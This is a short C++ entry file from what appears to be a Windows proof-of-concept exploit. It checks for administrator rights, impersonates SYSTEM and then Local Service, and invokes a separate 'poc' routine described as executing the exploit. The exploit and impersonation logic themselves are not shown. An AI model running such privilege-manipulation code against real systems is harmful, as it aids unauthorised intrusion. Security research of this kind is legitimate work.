#include "pch.hpp"
#include "poc.hpp"
#include "impersonate.hpp"

INT APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // Check for admin rights
    if (!impersonate->is_elevated()) {
		log_debug("You need to run this program as an administrator.");
        std::cin.get();
		return EXIT_FAILURE;
	}
    
    // First impersonate from admin to SYSTEM, then from SYSTEM to Local Service.
    impersonate->impersonate_as_system();
    impersonate->impersonate_as_local_service();

    // Execute the exploit
    poc->act();

    std::cin.get();
    return EXIT_SUCCESS;
}